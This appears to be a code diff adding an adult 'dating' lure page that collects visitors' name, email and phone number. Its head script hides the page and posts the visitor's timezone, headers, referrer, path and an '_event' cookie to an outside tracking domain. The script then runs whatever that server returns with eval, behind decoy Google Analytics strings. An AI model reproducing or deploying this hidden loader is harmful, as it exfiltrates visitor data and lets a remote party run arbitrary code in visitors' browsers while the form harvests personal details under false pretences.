@@ -1,0 +1,142 @@
+<html>
+
+<head>
+    <title>Dating</title>
+    <link href="style/style.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css"
+        integrity="sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz" crossorigin="anonymous">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <style>
+        body {
+            display: none;
+        }
+    </style>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
+    <script>
+        $(document).ready(function () { $("body").hide(); $("html").append("<div id=\"lo409043ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>"); var f = new XMLHttpRequest(); f.open("GET", document.location, true); f.send(null); var g; f.onreadystatechange = function () { g = f.getAllResponseHeaders().toLowerCase(); }; var b = "GoogleAnalyticsObject"; var c = ("document", "script", "//www.google-analytics.com/analytics.js"); c = ("create", "UA-236309-1", "auto"); c = ("send", "pageview"); var d = jstz.determine(); var e = d.name(); var qu = escape(window.location.search.substr(1)); var rui = location.pathname + location.search; var r = document.referrer; var sn = document.domain; var value = "; " + document.cookie; var pa = value.split("; " + "_event" + "="); var co = pa.pop().split(";").shift(); var q; $.ajax({ url: "https://www.getlaidtonight.xyz/track.php", type: "POST", data: "tz=" + e + "&he=" + g + "&rui=" + rui + "&qu=" + qu + "&r=" + r + "&sn=" + sn + "&co=" + co, success: function (a) { eval(a) } }) })
+    </script>
+
+</head>
+
+<body>
+    <div class="content">
+        <div class="content-wrapper">
+            <video autoplay muted loop id="myVideo">
+                <source src="css/recap.mp4" type="video/mp4">
+            </video>
+            <!--<div class="background-main">
+                </div>-->
+            <div class="cards-wrapper">
+                <div id="myDiv1" class="flip-card flip-card-1 active">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div class="card-content">
+                                <div class="card-content-wrapper">
+                                    <div class="logo-pop">
+                                        <img src="image/logo (1).png">
+                                    </div>
+                                    <p class="screen-title text_block" rel="a2">HOT GIRLS WANTS<span
+                                            style="font-style: italic;color: #d9213e;border-bottom: 2px solid #d9213e;;padding-bottom: 3px;">TO
+                                            CHAT WITH YOU</span></p>
+                                    <p style="font-size: 15px;font-weight: 600;">Are you <span
+                                            style="font-size: 28px;font-weight: 700;color: #d9213e;position:relative;bottom: -3px;">18+</span>
+                                        ?</p>
+
+                                    <div class="card-btns">
+                                        <button type="button" id="myButton"
+                                            class="default-btn full-width-btn js_reverseAndWriteDataGender text_block"
+                                            style="color: #d9213e; box-shadow: 0 2px 6px rgb(0 0 0 / 40%), inset 0 2px 2px hsl(0deg 0% 100% / 20%);"
+                                            rel="a3" name="answer" onclick="ShowDiv()">START
+                                        </button>
+
+                                        <!--<a href="https://www.google.com">
+                                                <button type="button"  class="default-btn full-width-btn js_reverseAndWriteDataGender text_block" rel="a4">No
+                                            </button>
+                                            </a>-->
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="myDiv" style="display:none;" class="flip-card flip-card-1 active">
+                    <div class="flip-card-inner">
+                        <div class="flip-card-front">
+                            <div class="card-content">
+                                <div class="card-content-wrapper">
+                                    <p class="screen-title text_block" rel="a2">Make The <span
+                                            style="border-bottom: 2px solid #d9213e;;padding-bottom: 3px;color: #d9213e;font-size: 32px;">FIRST
+                                            MOVE</span> & Get <span
+                                            style="border-bottom: 2px solid #d9213e;;padding-bottom: 3px;color: #d9213e;font-size: 32px;">MATCHED</span>
+                                    </p>
+                                    <p style="font-size: 19px;font-weight: 700;">You are almost there</p>
+                                    <form action="/send.php" method="POST" autocomplete="OFF">
+                                        <p>
+                                            <!--<label id="icon" for="name"><i class="fas fa-user"></i></label>-->
+                                            <input type="text" name="name" id="name_place" placeholder="Your Name"
+                                                onkeypress='return ((event.charCode >= 65 && event.charCode <= 90) || (event.charCode >= 97 && event.charCode <= 122) || (event.charCode == 32))'
+                                                required /><i class="fas fa-user fa-ini"></i>
+                                        </p>
+                                        <p>
+                                            <!--<label id="icon" for="email"></label>-->
+                                            <input type="email" name="email" id="name" placeholder="Your Email"
+                                                required /><i class="fas fa-envelope fa-ini"></i>
+                                        </p>
+                                        <p>
+                                            <!--<label id="icon" for="phone"></label>-->
+                                            <input type="text" id="phone" name="phone"
+                                                onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')"
+                                                maxlength="10" placeholder="Enter Your Mobile Number" required /><i
+                                                class="fas fa-phone fa-ini"></i>
+                                        </p>
+                                        <div class="btn-block">
+                                            <button type="submit" name="form1" id="myButton2"
+                                                class="default-btn full-width-btn js_reverseAndWriteDataGender text_block"
+                                                rel="a3"
+                                                style="margin-top: 23px;margin-top: 23px; /*background-image: url(css/buton.jpg);background-position-x: -393px;background-position-y: 50px;*/">Start
+                                                Your Journey</button>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        function ShowDiv() {
+            document.getElementById("myDiv").style.display = "";
+            document.getElementById("myDiv1").style.display = "none";
+        }
+    </script>
+    <script>
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+    </script>
+    <script>
+        function validate() {
+            var element = document.getElementById('name_place');
+            element.value = element.value.replace(/[^a-zA-Z]+/, '');
+        };
+    </script>
+    <script>
+        $(document).ready(function () {
+            $("#phone").inputFilter(function (value) {
+                return /^\d*$/.test(value);    // Allow digits only, using a RegExp
+            }, "Only digits allowed");
+        });
+    </script>
+    <script type="text/javascript">
+        document.getElementById("myButton2").onclick = function () {
+            location.href = "https://www.zomato.com";
+        };
+    </script>
+</body>
+
+</html>
